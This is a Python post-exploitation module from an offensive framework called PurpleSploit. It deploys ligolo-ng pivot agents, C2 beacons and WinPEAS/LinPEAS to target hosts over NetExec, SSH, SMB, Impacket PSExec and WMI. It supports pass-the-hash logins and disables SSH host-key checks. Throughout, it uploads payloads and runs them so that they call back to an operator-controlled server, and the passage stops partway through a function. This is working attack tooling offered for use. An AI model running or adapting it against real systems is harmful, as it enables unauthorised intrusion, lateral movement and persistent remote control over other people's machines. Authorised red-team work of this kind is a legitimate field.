"""
Deploy Module

Unified deployment module for various payloads and tools.
Supports deployment of Ligolo pivots, C2 beacons, and enumeration scripts
via multiple deployment methods (NXC, SSH, SMB, WMI, etc.).
"""

from purplesploit.core.module import BaseModule
import subprocess
import os
from pathlib import Path
from typing import Dict, Any, List


class DeployModule(BaseModule):
    """
    Deploy Module - Unified deployment for pivots, beacons, and scripts.

    Deploys various payloads to target systems using multiple deployment
    methods including NXC, SSH, SMB, PSExec, and WMIExec.
    """

    def __init__(self, framework):
        super().__init__(framework)

    @property
    def name(self) -> str:
        return "Deploy"

    @property
    def description(self) -> str:
        return "Unified deployment module for pivots, C2 beacons, and enumeration scripts"

    @property
    def author(self) -> str:
        return "PurpleSploit Team"

    @property
    def category(self) -> str:
        return "post"

    def get_operations(self) -> List[Dict[str, Any]]:
        """Return list of deployment operations."""
        return [
            # Ligolo Pivot Deployment Operations
            {
                "name": "Deploy Ligolo via NXC",
                "description": "Deploy ligolo-ng agent using NetExec (NXC)",
                "handler": self.deploy_ligolo_nxc,
                "subcategory": "ligolo"
            },
            {
                "name": "Deploy Ligolo via SSH",
                "description": "Deploy ligolo-ng agent via SSH to Linux/Unix targets",
                "handler": self.deploy_ligolo_ssh,
                "subcategory": "ligolo"
            },
            {
                "name": "Deploy Ligolo via SMB",
                "description": "Deploy ligolo-ng agent via SMB share upload",
                "handler": self.deploy_ligolo_smb,
                "subcategory": "ligolo"
            },
            {
                "name": "Deploy Ligolo via PSExec",
                "description": "Deploy ligolo-ng agent using Impacket PSExec",
                "handler": self.deploy_ligolo_psexec,
                "subcategory": "ligolo"
            },
            {
                "name": "Deploy Ligolo via WMIExec",
                "description": "Deploy ligolo-ng agent using Impacket WMIExec",
                "handler": self.deploy_ligolo_wmiexec,
                "subcategory": "ligolo"
            },

            # C2 Beacon Deployment Operations
            {
                "name": "Deploy C2 Beacon via NXC",
                "description": "Deploy C2 beacon using NetExec (NXC)",
                "handler": self.deploy_beacon_nxc,
                "subcategory": "c2_beacon"
            },
            {
                "name": "Deploy C2 Beacon via SSH",
                "description": "Deploy C2 beacon via SSH to Linux/Unix targets",
                "handler": self.deploy_beacon_ssh,
                "subcategory": "c2_beacon"
            },
            {
                "name": "Deploy C2 Beacon via SMB",
                "description": "Deploy C2 beacon via SMB share upload",
                "handler": self.deploy_beacon_smb,
                "subcategory": "c2_beacon"
            },
            {
                "name": "Deploy C2 Beacon via PSExec",
                "description": "Deploy C2 beacon using Impacket PSExec",
                "handler": self.deploy_beacon_psexec,
                "subcategory": "c2_beacon"
            },
            {
                "name": "Deploy C2 Beacon via WMIExec",
                "description": "Deploy C2 beacon using Impacket WMIExec",
                "handler": self.deploy_beacon_wmiexec,
                "subcategory": "c2_beacon"
            },
            {
                "name": "Deploy C2 Beacon via WinRM",
                "description": "Deploy C2 beacon using WinRM/Evil-WinRM",
                "handler": self.deploy_beacon_winrm,
                "subcategory": "c2_beacon"
            },

            # Script Deployment Operations (WinPEAS, LinPEAS, etc.)
            {
                "name": "Deploy WinPEAS via NXC",
                "description": "Deploy WinPEAS enumeration script using NetExec",
                "handler": self.deploy_winpeas_nxc,
                "subcategory": "scripts"
            },
            {
                "name": "Deploy WinPEAS via SMB",
                "description": "Deploy WinPEAS via SMB share upload",
                "handler": self.deploy_winpeas_smb,
                "subcategory": "scripts"
            },
            {
                "name": "Deploy WinPEAS via PSExec",
                "description": "Deploy WinPEAS using Impacket PSExec",
                "handler": self.deploy_winpeas_psexec,
                "subcategory": "scripts"
            },
            {
                "name": "Deploy LinPEAS via SSH",
                "description": "Deploy LinPEAS enumeration script via SSH",
                "handler": self.deploy_linpeas_ssh,
                "subcategory": "scripts"
            },
            {
                "name": "Deploy LinPEAS via NXC",
                "description": "Deploy LinPEAS using NetExec SSH module",
                "handler": self.deploy_linpeas_nxc,
                "subcategory": "scripts"
            },
            {
                "name": "Deploy Custom Script via NXC",
                "description": "Deploy custom script using NetExec",
                "handler": self.deploy_script_nxc,
                "subcategory": "scripts"
            },
            {
                "name": "Deploy Custom Script via SSH",
                "description": "Deploy custom script via SSH",
                "handler": self.deploy_script_ssh,
                "subcategory": "scripts"
            },
            {
                "name": "Deploy Custom Script via SMB",
                "description": "Deploy custom script via SMB",
                "handler": self.deploy_script_smb,
                "subcategory": "scripts"
            },
        ]

    def _init_options(self):
        """Initialize module-specific options."""
        super()._init_options()

        self.options.update({
            "RHOST": {
                "value": None,
                "required": True,
                "description": "Target host IP address",
                "default": None
            },
            "USERNAME": {
                "value": None,
                "required": False,
                "description": "Username for authentication",
                "default": None
            },
            "PASSWORD": {
                "value": None,
                "required": False,
                "description": "Password for authentication",
                "default": None
            },
            "DOMAIN": {
                "value": "",
                "required": False,
                "description": "Domain for Windows authentication",
                "default": ""
            },
            "HASH": {
                "value": None,
                "required": False,
                "description": "NTLM hash for authentication",
                "default": None
            },
            "SSH_KEY": {
                "value": None,
                "required": False,
                "description": "SSH private key path (for SSH deployment)",
                "default": None
            },
            "LOCAL_FILE": {
                "value": None,
                "required": False,
                "description": "Path to local file to deploy",
                "default": None
            },
            "REMOTE_PATH": {
                "value": None,
                "required": False,
                "description": "Remote path where file will be deployed",
                "default": None
            },
            "LIGOLO_SERVER": {
                "value": "127.0.0.1:11601",
                "required": False,
                "description": "Ligolo-ng proxy server address (IP:PORT)",
                "default": "127.0.0.1:11601"
            },
            "C2_SERVER": {
                "value": None,
                "required": False,
                "description": "C2 server address for beacon callback (IP:PORT)",
                "default": None
            },
            "BEACON_TYPE": {
                "value": "generic",
                "required": False,
                "description": "Type of C2 beacon (sliver, metasploit, cobalt, generic)",
                "default": "generic"
            },
            "EXECUTE": {
                "value": True,
                "required": False,
                "description": "Execute the file after deployment",
                "default": True
            },
            "EXEC_ARGS": {
                "value": "",
                "required": False,
                "description": "Arguments to pass when executing the deployed file",
                "default": ""
            },
            "TARGET_OS": {
                "value": "windows",
                "required": False,
                "description": "Target OS (windows, linux)",
                "default": "windows"
            },
            "SCRIPT_TYPE": {
                "value": "winpeas",
                "required": False,
                "description": "Type of script (winpeas, linpeas, custom)",
                "default": "winpeas"
            },
            "SAVE_OUTPUT": {
                "value": True,
                "required": False,
                "description": "Save script output to local file",
                "default": True
            },
            "OUTPUT_FILE": {
                "value": None,
                "required": False,
                "description": "Local file path to save output",
                "default": None
            }
        })

    # ========================================================================
    # LIGOLO PIVOT DEPLOYMENT OPERATIONS
    # ========================================================================

    def deploy_ligolo_nxc(self) -> Dict[str, Any]:
        """Deploy ligolo-ng agent via NetExec (NXC)."""
        self.log("Deploying Ligolo agent via NetExec...")

        rhost = self.get_option("RHOST")
        username = self.get_option("USERNAME")
        password = self.get_option("PASSWORD")
        domain = self.get_option("DOMAIN")
        hash_val = self.get_option("HASH")
        local_file = self.get_option("LOCAL_FILE")
        ligolo_server = self.get_option("LIGOLO_SERVER")

        if not all([rhost, username, local_file]):
            return {
                "success": False,
                "error": "Missing required options: RHOST, USERNAME, LOCAL_FILE"
            }

        try:
            # Build NXC command for upload
            remote_path = "C:\\Windows\\Temp\\ligolo-agent.exe"
            cmd = ["nxc", "smb", rhost, "-u", username]

            if domain:
                cmd.extend(["-d", domain])

            if hash_val:
                cmd.extend(["-H", hash_val])
            elif password:
                cmd.extend(["-p", password])
            else:
                return {"success": False, "error": "No PASSWORD or HASH provided"}

            # Upload file
            cmd.extend(["--put-file", local_file, remote_path])

            self.log(f"Uploading Ligolo agent to {rhost}...")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)

            if result.returncode != 0:
                return {
                    "success": False,
                    "error": f"Upload failed: {result.stderr}"
                }

            # Execute agent
            exec_cmd = ["nxc", "smb", rhost, "-u", username]

            if domain:
                exec_cmd.extend(["-d", domain])

            if hash_val:
                exec_cmd.extend(["-H", hash_val])
            else:
                exec_cmd.extend(["-p", password])

            exec_cmd.extend(["-x", f"{remote_path} -connect {ligolo_server} -ignore-cert"])

            self.log("Executing Ligolo agent...")
            exec_result = subprocess.run(exec_cmd, capture_output=True, text=True, timeout=60)

            self.log("Ligolo agent deployed successfully", "success")
            return {
                "success": True,
                "output": exec_result.stdout,
                "method": "nxc",
                "remote_path": remote_path
            }

        except Exception as e:
            return {
                "success": False,
                "error": f"NXC deployment failed: {str(e)}"
            }

    def deploy_ligolo_ssh(self) -> Dict[str, Any]:
        """Deploy ligolo-ng agent via SSH."""
        self.log("Deploying Ligolo agent via SSH...")

        rhost = self.get_option("RHOST")
        username = self.get_option("USERNAME")
        password = self.get_option("PASSWORD")
        ssh_key = self.get_option("SSH_KEY")
        local_file = self.get_option("LOCAL_FILE")
        ligolo_server = self.get_option("LIGOLO_SERVER")

        if not all([rhost, username, local_file]):
            return {
                "success": False,
                "error": "Missing required options: RHOST, USERNAME, LOCAL_FILE"
            }

        try:
            remote_path = "/tmp/ligolo-agent"

            # Upload via SCP
            if ssh_key:
                scp_cmd = [
                    "scp", "-i", ssh_key,
                    "-o", "StrictHostKeyChecking=no",
                    local_file,
                    f"{username}@{rhost}:{remote_path}"
                ]
            else:
                scp_cmd = [
                    "sshpass", "-p", password,
                    "scp", "-o", "StrictHostKeyChecking=no",
                    local_file,
                    f"{username}@{rhost}:{remote_path}"
                ]

            self.log(f"Uploading agent to {rhost}...")
            result = subprocess.run(scp_cmd, capture_output=True, text=True, timeout=60)

            if result.returncode != 0:
                return {
                    "success": False,
                    "error": f"Upload failed: {result.stderr}"
                }

            # Execute agent
            if ssh_key:
                ssh_cmd = [
                    "ssh", "-i", ssh_key,
                    "-o", "StrictHostKeyChecking=no",
                    f"{username}@{rhost}",
                    f"chmod +x {remote_path} && nohup {remote_path} -connect {ligolo_server} -ignore-cert &"
                ]
            else:
                ssh_cmd = [
                    "sshpass", "-p", password,
                    "ssh", "-o", "StrictHostKeyChecking=no",
                    f"{username}@{rhost}",
                    f"chmod +x {remote_path} && nohup {remote_path} -connect {ligolo_server} -ignore-cert &"
                ]

            self.log("Executing agent...")
            exec_result = subprocess.run(ssh_cmd, capture_output=True, text=True, timeout=60)

            self.log("Ligolo agent deployed successfully", "success")
            return {
                "success": True,
                "output": exec_result.stdout,
                "method": "ssh",
                "remote_path": remote_path
            }

        except Exception as e:
            return {
                "success": False,
                "error": f"SSH deployment failed: {str(e)}"
            }

    def deploy_ligolo_smb(self) -> Dict[str, Any]:
        """Deploy ligolo-ng agent via SMB."""
        self.log("Deploying Ligolo agent via SMB...")

        rhost = self.get_option("RHOST")
        username = self.get_option("USERNAME")
        password = self.get_option("PASSWORD")
        domain = self.get_option("DOMAIN")
        local_file = self.get_option("LOCAL_FILE")
        ligolo_server = self.get_option("LIGOLO_SERVER")

        if not all([rhost, username, password, local_file]):
            return {
                "success": False,
                "error": "Missing required options: RHOST, USERNAME, PASSWORD, LOCAL_FILE"
            }

        try:
            # Upload via SMB
            upload_result = self._upload_via_smb(
                rhost, username, password, domain, local_file, "ligolo-agent.exe"
            )

            if not upload_result["success"]:
                return upload_result

            # Execute via WMI
            exec_result = self._execute_via_wmi(
                rhost, username, password, domain, None,
                upload_result["remote_path"],
                f"-connect {ligolo_server} -ignore-cert"
            )

            if exec_result["success"]:
                self.log("Ligolo agent deployed successfully", "success")

            return exec_result

        except Exception as e:
            return {
                "success": False,
                "error": f"SMB deployment failed: {str(e)}"
            }

    def deploy_ligolo_psexec(self) -> Dict[str, Any]:
        """Deploy ligolo-ng agent via PSExec."""
        self.log("Deploying Ligolo agent via PSExec...")

        rhost = self.get_option("RHOST")
        username = self.get_option("USERNAME")
        password = self.get_option("PASSWORD")
        domain = self.get_option("DOMAIN")
        hash_val = self.get_option("HASH")
        local_file = self.get_option("LOCAL_FILE")
        ligolo_server = self.get_option("LIGOLO_SERVER")

        if not all([rhost, username, local_file]):
            return {
                "success": False,
                "error": "Missing required options: RHOST, USERNAME, LOCAL_FILE"
            }

        try:
            # Build auth string
            auth = f"{domain}/{username}" if domain else username
            if hash_val:
                auth += f"@{rhost} -hashes :{hash_val}"
            elif password:
                auth += f":{password}@{rhost}"
            else:
                return {"success": False, "error": "No PASSWORD or HASH provided"}

            # Execute via PSExec with file copy
            cmd = [
                "impacket-psexec",
                auth,
                "-c", local_file,
                f"ligolo-agent.exe -connect {ligolo_server} -ignore-cert"
            ]

            self.log("Deploying via PSExec...")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)

            if "Impacket" in result.stdout or result.returncode == 0:
                self.log("Ligolo agent deployed successfully", "success")
                return {
                    "success": True,
                    "output": result.stdout,
                    "method": "psexec"
                }
            else:
                return {
                    "success": False,
                    "error": f"PSExec failed: {result.stderr}"
                }

        except Exception as e:
            return {
                "success": False,
                "error": f"PSExec deployment failed: {str(e)}"
            }

    def deploy_ligolo_wmiexec(self) -> Dict[str, Any]:
        """Deploy ligolo-ng agent via WMIExec."""
        self.log("Deploying Ligolo agent via WMIExec...")

        rhost = self.get_option("RHOST")
        username = self.get_option("USERNAME")
        password = self.get_option("PASSWORD")
        domain = self.get_option("DOMAIN")
        hash_val = self.get_option("HASH")
        local_file = self.get_option("LOCAL_FILE")
        ligolo_server = self.get_option("LIGOLO_SERVER")

        if not all([rhost, username, local_file]):
            return {
                "success": False,
                "error": "Missing required options: RHOST, USERNAME, LOCAL_FILE"
            }

        try:
            # First upload via SMB
            upload_result = self._upload_via_smb(
                rhost, username, password, domain, local_file, "ligolo-agent.exe"
            )

            if not upload_result["success"]:
                return upload_result

            # Execute via WMI
            exec_result = self._execute_via_wmi(
                rhost, username, password, domain, hash_val,
                upload_result["remote_path"],
                f"-connect {ligolo_server} -ignore-cert"
            )

            if exec_result["success"]:
                self.log("Ligolo agent deployed successfully", "success")

            return exec_result

        except Exception as e:
            return {
                "success": False,
                "error": f"WMIExec deployment failed: {str(e)}"
            }

    # ========================================================================
    # C2 BEACON DEPLOYMENT OPERATIONS
    # ========================================================================

    def deploy_beacon_nxc(self) -> Dict[str, Any]:
        """Deploy C2 beacon via NetExec."""
        self.log("Deploying C2 beacon via NetExec...")

        rhost = self.get_option("RHOST")
        username = self.get_option("USERNAME")
        password = self.get_option("PASSWORD")
        domain = self.get_option("DOMAIN")
        hash_val = self.get_option("HASH")
        local_file = self.get_option("LOCAL_FILE")
        execute = self.get_option("EXECUTE")
        exec_args = self.get_option("EXEC_ARGS")

        if not all([rhost, username, local_file]):
            return {
                "success": False,
                "error": "Missing required options: RHOST, USERNAME, LOCAL_FILE"
            }

        try:
            # Determine remote path based on filename
            filename = Path(local_file).name
            remote_path = f"C:\\Windows\\Temp\\{filename}"

            # Build NXC upload command
            cmd = ["nxc", "smb", rhost, "-u", username]

            if domain:
                cmd.extend(["-d", domain])

            if hash_val:
                cmd.extend(["-H", hash_val])
            elif password:
                cmd.extend(["-p", password])
            else:
                return {"success": False, "error": "No PASSWORD or HASH provided"}

            cmd.extend(["--put-file", local_file, remote_path])

            self.log(f"Uploading beacon to {rhost}...")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)

            if result.returncode != 0:
                return {
                    "success": False,
                    "error": f"Upload failed: {result.stderr}"
                }

            output = result.stdout

            # Execute if requested
            if execute:
                exec_cmd = ["nxc", "smb", rhost, "-u", username]

                if domain:
                    exec_cmd.extend(["-d", domain])

                if hash_val:
                    exec_cmd.extend(["-H", hash_val])
                else:
                    exec_cmd.extend(["-p", password])

                exec_command = f"{remote_path} {exec_args}".strip()
                exec_cmd.extend(["-x", exec_command])

                self.log("Executing beacon...")
                exec_result = subprocess.run(exec_cmd, capture_output=True, text=True, timeout=60)
                output += "\n" + exec_result.stdout

            self.log("C2 beacon deployed successfully", "success")
            return {
                "success": True,
                "output": output,
                "method": "nxc",
                "remote_path": remote_path
            }

        except Exception as e:
            return {
                "success": False,
                "error": f"NXC deployment failed: {str(e)}"
            }

    def deploy_beacon_ssh(self) -> Dict[str, Any]:
        """Deploy C2 beacon via SSH."""
        self.log("Deploying C2 beacon via SSH...")

        rhost = self.get_option("RHOST")
        username = self.get_option("USERNAME")
        password = self.get_option("PASSWORD")
        ssh_key = self.get_option("SSH_KEY")
        local_file = self.get_option("LOCAL_FILE")
        execute = self.get_option("EXECUTE")
        exec_args = self.get_option("EXEC_ARGS")

        if not all([rhost, username, local_file]):
            return {
                "success": False,
                "error": "Missing required options: RHOST, USERNAME, LOCAL_FILE"
            }

        try:
            filename = Path(local_file).name
            remote_path = f"/tmp/{filename}"

            # Upload via SCP
            if ssh_key:
                scp_cmd = [
                    "scp", "-i", ssh_key,
                    "-o", "StrictHostKeyChecking=no",
                    local_file,
                    f"{username}@{rhost}:{remote_path}"
                ]
            else:
                scp_cmd = [
                    "sshpass", "-p", password,
                    "scp", "-o", "StrictHostKeyChecking=no",
                    local_file,
                    f"{username}@{rhost}:{remote_path}"
                ]

            self.log(f"Uploading beacon to {rhost}...")
            result = subprocess.run(scp_cmd, capture_output=True, text=True, timeout=60)

            if result.returncode != 0:
                return {
                    "success": False,
                    "error": f"Upload failed: {result.stderr}"
                }

            output = ""

            # Execute if requested
            if execute:
                exec_command = f"chmod +x {remote_path} && nohup {remote_path} {exec_args} &"

                if ssh_key:
                    ssh_cmd = [
                        "ssh", "-i", ssh_key,
                        "-o", "StrictHostKeyChecking=no",
                        f"{username}@{rhost}",
                        exec_command
                    ]
                else:
                    ssh_cmd = [
                        "sshpass", "-p", password,
                        "ssh", "-o", "StrictHostKeyChecking=no",
                        f"{username}@{rhost}",
                        exec_command
                    ]

                self.log("Executing beacon...")
                exec_result = subprocess.run(ssh_cmd, capture_output=True, text=True, timeout=60)
                output = exec_result.stdout

            self.log("C2 beacon deployed successfully", "success")
            return {
                "success": True,
                "output": output,
                "method": "ssh",
                "remote_path": remote_path
            }

        except Exception as e:
            return {
                "success": False,
                "error": f"SSH deployment failed: {str(e)}"
            }

    def deploy_beacon_smb(self) -> Dict[str, Any]:
        """Deploy C2 beacon via SMB."""
        self.log("Deploying C2 beacon via SMB...")

        rhost = self.get_option("RHOST")
        username = self.get_option("USERNAME")
        password = self.get_option("PASSWORD")
        domain = self.get_option("DOMAIN")
        local_file = self.get_option("LOCAL_FILE")
        execute = self.get_option("EXECUTE")
        exec_args = self.get_option("EXEC_ARGS")

        if not all([rhost, username, password, local_file]):
            return {
                "success": False,
                "error": "Missing required options: RHOST, USERNAME, PASSWORD, LOCAL_FILE"
            }

        try:
            filename = Path(local_file).name

            # Upload via SMB
            upload_result = self._upload_via_smb(
                rhost, username, password, domain, local_file, filename
            )

            if not upload_result["success"]:
                return upload_result

            # Execute if requested
            if execute:
                exec_result = self._execute_via_wmi(
                    rhost, username, password, domain, None,
                    upload_result["remote_path"],
                    exec_args
                )

                if exec_result["success"]:
                    self.log("C2 beacon deployed successfully", "success")

                return exec_result
            else:
                self.log("C2 beacon uploaded successfully", "success")
                return {
                    "success": True,
                    "output": "Beacon uploaded (not executed)",
                    "method": "smb",
                    "remote_path": upload_result["remote_path"]
                }

        except Exception as e:
            return {
                "success": False,
                "error": f"SMB deployment failed: {str(e)}"
            }

    def deploy_beacon_psexec(self) -> Dict[str, Any]:
        """Deploy C2 beacon via PSExec."""
        self.log("Deploying C2 beacon via PSExec...")

        rhost = self.get_option("RHOST")
        username = self.get_option("USERNAME")
        password = self.get_option("PASSWORD")
        domain = self.get_option("DOMAIN")
        hash_val = self.get_option("HASH")
        local_file = self.get_option("LOCAL_FILE")
        exec_args = self.get_option("EXEC_ARGS")

        if not all([rhost, username, local_file]):
            return {
                "success": False,
                "error": "Missing required options: RHOST, USERNAME, LOCAL_FILE"
            }

        try:
            filename = Path(local_file).name

            # Build auth string
            auth = f"{domain}/{username}" if domain else username
            if hash_val:
                auth += f"@{rhost} -hashes :{hash_val}"
            elif password:
                auth += f":{password}@{rhost}"
            else:
                return {"success": False, "error": "No PASSWORD or HASH provided"}

            # Execute via PSExec with file copy
            exec_command = f"{filename} {exec_args}".strip()
            cmd = [
                "impacket-psexec",
                auth,
                "-c", local_file,
                exec_command
            ]

            self.log("Deploying via PSExec...")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)

            if "Impacket" in result.stdout or result.returncode == 0:
                self.log("C2 beacon deployed successfully", "success")
                return {
                    "success": True,
                    "output": result.stdout,
                    "method": "psexec"
                }
            else:
                return {
                    "success": False,
                    "error": f"PSExec failed: {result.stderr}"
                }

        except Exception as e:
            return {
                "success": False,
                "error": f"PSExec deployment failed: {str(e)}"
            }

    def deploy_beacon_wmiexec(self) -> Dict[str, Any]:
        """Deploy C2 beacon via WMIExec."""
        self.log("Deploying C2 beacon via WMIExec...")

        rhost = self.get_option("RHOST")
        username = self.get_option("USERNAME")
        password = self.get_option("PASSWORD")
        domain = self.get_option("DOMAIN")
        hash_val = self.get_option("HASH")
        local_file = self.get_option("LOCAL_FILE")
        exec_args = self.get_option("EXEC_ARGS")

        if not all([rhost, username, local_file]):
            return {
                "success": False,
                "error": "Missing required options: RHOST, USERNAME, LOCAL_FILE"
            }

        try:
            filename = Path(local_file).name

            # Upload via SMB
            upload_result = self._upload_via_smb(
                rhost, username, password, domain, local_file, filename
            )

            if not upload_result["success"]:
                return upload_result

            # Execute via WMI
            exec_result = self._execute_via_wmi(
                rhost, username, password, domain, hash_val,
                upload_result["remote_path"],
                exec_args
            )

            if exec_result["success"]:
                self.log("C2 beacon deployed successfully", "success")

            return exec_result

        except Exception as e:
            return {
                "success": False,
                "error": f"WMIExec deployment failed: {str(e)}"
            }

    def deploy_beacon_winrm(self) -> Dict[str, Any]:
        """Deploy C2 beacon via WinRM."""
        self.log("Deploying C2 beacon via WinRM...")

        rhost = self.get_option("RHOST")
        username = self.get_option("USERNAME")
        password = self.get_option("PASSWORD")
        local_file = self.get_option("LOCAL_FILE")
        execute = self.get_option("EXECUTE")
        exec_args = self.get_option("EXEC_ARGS")

        if not all([rhost, username, password, local_file]):
            return {
                "success": False,
                "error": "Missing required options: RHOST, USERNAME, PASSWORD, LOCAL_FILE"
            }

        try:
            filename = Path(local_file).name
            remote_path = f"C:\\Windows\\Temp\\{filename}"

            # Upload via evil-winrm
            # Note: evil-winrm doesn't have a direct upload command in CLI mode
            # We'll use PowerShell command to download from our webserver

            self.log("Note: WinRM deployment requires hosting the file on a web server")
            self.log("Consider using 'webserver start' command to host the file", "info")

            return {
                "success": False,
                "error": "WinRM deployment requires manual file hosting. Use NXC or SMB instead."
            }

        except Exception as e:
            return {
                "success": False,
                "error": f"WinRM deployment failed: {str(e)}"
            }

    # ========================================================================
    # SCRIPT DEPLOYMENT OPERATIONS (WinPEAS, LinPEAS, Custom Scripts)
    # ========================================================================

    def deploy_winpeas_nxc(self) -> Dict[str, Any]:
        """Deploy WinPEAS via NetExec."""
        self.log("Deploying WinPEAS via NetExec...")

        rhost = self.get_option("RHOST")
        username = self.get_option("USERNAME")
        password = self.get_option("PASSWORD")
        domain = self.get_option("DOMAIN")
        hash_val = self.get_option("HASH")
        local_file = self.get_option("LOCAL_FILE")
        save_output = self.get_option("SAVE_OUTPUT")
        output_file = self.get_option("OUTPUT_FILE")

        if not local_file:
            return {
                "success": False,
                "error": "LOCAL_FILE not set. Please provide path to winPEAS executable/script"
            }

        if not all([rhost, username]):
            return {
                "success": False,
                "error": "Missing required options: RHOST, USERNAME"
            }

        try:
            remote_path = "C:\\Windows\\Temp\\winpeas.exe"

            # Upload WinPEAS
            cmd = ["nxc", "smb", rhost, "-u", username]

            if domain:
                cmd.extend(["-d", domain])

            if hash_val:
                cmd.extend(["-H", hash_val])
            elif password:
                cmd.extend(["-p", password])
            else:
                return {"success": False, "error": "No PASSWORD or HASH provided"}

            cmd.extend(["--put-file", local_file, remote_path])

            self.log(f"Uploading WinPEAS to {rhost}...")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)

            if result.returncode != 0:
                return {
                    "success": False,
                    "error": f"Upload failed: {result.stderr}"
                }

            # Execute WinPEAS
            exec_cmd = ["nxc", "smb", rhost, "-u", username]

            if domain:
                exec_cmd.extend(["-d", domain])

            if hash_val:
                exec_cmd.extend(["-H", hash_val])
            else:
                exec_cmd.extend(["-p", password])

            exec_cmd.extend(["-x", remote_path])

            self.log("Executing WinPEAS...")
            exec_result = subprocess.run(exec_cmd, capture_output=True, text=True, timeout=300)

            output = exec_result.stdout

            # Save output if requested
            if save_output and output_file:
                with open(output_file, 'w') as f:
                    f.write(output)
                self.log(f"Output saved to {output_file}", "success")

            self.log("WinPEAS execution completed", "success")
            return {
                "success": True,
                "output": output,
                "method": "nxc",
                "remote_path": remote_path
            }

        except Exception as e:
            return {
                "success": False,
                "error": f"WinPEAS deployment failed: {str(e)}"
            }

    def deploy_winpeas_smb(self) -> Dict[str, Any]:
        """Deploy WinPEAS via SMB."""
        self.log("Deploying WinPEAS via SMB...")

        rhost = self.get_option("RHOST")
        username = self.get_option("USERNAME")
        password = self.get_option("PASSWORD")
        domain = self.get_option("DOMAIN")
        local_file = self.get_option("LOCAL_FILE")
        save_output = self.get_option("SAVE_OUTPUT")
        output_file = self.get_option("OUTPUT_FILE")

        if not local_file:
            return {
                "success": False,
                "error": "LOCAL_FILE not set. Please provide path to winPEAS executable"
            }

        if not all([rhost, username, password]):
            return {
                "success": False,
                "error": "Missing required options: RHOST, USERNAME, PASSWORD"
            }

        try:
            # Upload via SMB
            upload_result = self._upload_via_smb(
                rhost, username, password, domain, local_file, "winpeas.exe"
            )

            if not upload_result["success"]:
                return upload_result

            # Execute via WMI and capture output
            exec_result = self._execute_via_wmi(
                rhost, username, password, domain, None,
                upload_result["remote_path"],
                ""
            )

            if exec_result["success"]:
                output = exec_result.get("output", "")

                # Save output if requested
                if save_output and output_file:
                    with open(output_file, 'w') as f:
                        f.write(output)
                    self.log(f"Output saved to {output_file}", "success")

                self.log("WinPEAS execution completed", "success")

            return exec_result

        except Exception as e:
            return {
                "success": False,
                "error": f"WinPEAS deployment failed: {str(e)}"
            }

    def deploy_winpeas_psexec(self) -> Dict[str, Any]:
        """Deploy WinPEAS via PSExec."""
        self.log("Deploying WinPEAS via PSExec...")

        rhost = self.get_option("RHOST")
        username = self.get_option("USERNAME")
        password = self.get_option("PASSWORD")
        domain = self.get_option("DOMAIN")
        hash_val = self.get_option("HASH")
        local_file = self.get_option("LOCAL_FILE")
        save_output = self.get_option("SAVE_OUTPUT")
        output_file = self.get_option("OUTPUT_FILE")

        if not local_file:
            return {
                "success": False,
                "error": "LOCAL_FILE not set. Please provide path to winPEAS executable"
            }

        if not all([rhost, username]):
            return {
                "success": False,
                "error": "Missing required options: RHOST, USERNAME"
            }

        try:
            # Build auth string
            auth = f"{domain}/{username}" if domain else username
            if hash_val:
                auth += f"@{rhost} -hashes :{hash_val}"
            elif password:
                auth += f":{password}@{rhost}"
            else:
                return {"success": False, "error": "No PASSWORD or HASH provided"}

            # Execute via PSExec
            cmd = [
                "impacket-psexec",
                auth,
                "-c", local_file,
                "winpeas.exe"
            ]

            self.log("Executing WinPEAS via PSExec...")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)

            output = result.stdout

            # Save output if requested
            if save_output and output_file:
                with open(output_file, 'w') as f:
                    f.write(output)
                self.log(f"Output saved to {output_file}", "success")

            if "Impacket" in output or result.returncode == 0:
                self.log("WinPEAS execution completed", "success")
                return {
                    "success": True,
                    "output": output,
                    "method": "psexec"
                }
            else:
                return {
                    "success": False,
                    "error": f"PSExec failed: {result.stderr}"
                }

        except Exception as e:
            return {
                "success": False,
                "error": f"WinPEAS deployment failed: {str(e)}"
            }

    def deploy_linpeas_ssh(self) -> Dict[str, Any]:
        """Deploy LinPEAS via SSH."""
        self.log("Deploying LinPEAS via SSH...")

        rhost = self.get_option("RHOST")
        username = self.get_option("USERNAME")
        password = self.get_option("PASSWORD")
        ssh_key = self.get_option("SSH_KEY")
        local_file = self.get_option("LOCAL_FILE")
        save_output = self.get_option("SAVE_OUTPUT")
        output_file = self.get_option("OUTPUT_FILE")

        if not local_file:
            return {
                "success": False,
                "error": "LOCAL_FILE not set. Please provide path to linPEAS script"
            }

        if not all([rhost, username]):
            return {
                "success": False,
                "error": "Missing required options: RHOST, USERNAME"
            }

        try:
            remote_path = "/tmp/linpeas.sh"

            # Upload via SCP
            if ssh_key:
                scp_cmd = [
                    "scp", "-i", ssh_key,
                    "-o", "StrictHostKeyChecking=no",
                    local_file,
                    f"{username}@{rhost}:{remote_path}"
                ]
            else:
                scp_cmd = [
                    "sshpass", "-p", password,
                    "scp", "-o", "StrictHostKeyChecking=no",
                    local_file,
                    f"{username}@{rhost}:{remote_path}"
                ]

            self.log(f"Uploading LinPEAS to {rhost}...")
            result = subprocess.run(scp_cmd, capture_output=True, text=True, timeout=60)

            if result.returncode != 0:
                return {
                    "success": False,
                    "error": f"Upload failed: {result.stderr}"
                }

            # Execute LinPEAS
            exec_command = f"chmod +x {remote_path} && {remote_path}"

            if ssh_key:
                ssh_cmd = [
                    "ssh", "-i", ssh_key,
                    "-o", "StrictHostKeyChecking=no",
                    f"{username}@{rhost}",
                    exec_command
                ]
            else:
                ssh_cmd = [
                    "sshpass", "-p", password,
                    "ssh", "-o", "StrictHostKeyChecking=no",
                    f"{username}@{rhost}",
                    exec_command
                ]

            self.log("Executing LinPEAS...")
            exec_result = subprocess.run(ssh_cmd, capture_output=True, text=True, timeout=300)

            output = exec_result.stdout

            # Save output if requested
            if save_output and output_file:
                with open(output_file, 'w') as f:
                    f.write(output)
                self.log(f"Output saved to {output_file}", "success")

            self.log("LinPEAS execution completed", "success")
            return {
                "success": True,
                "output": output,
                "method": "ssh",
                "remote_path": remote_path
            }

        except Exception as e:
            return {
                "success": False,
                "error": f"LinPEAS deployment failed: {str(e)}"
            }

    def deploy_linpeas_nxc(self) -> Dict[str, Any]:
        """Deploy LinPEAS via NetExec SSH."""
        self.log("Deploying LinPEAS via NetExec SSH...")

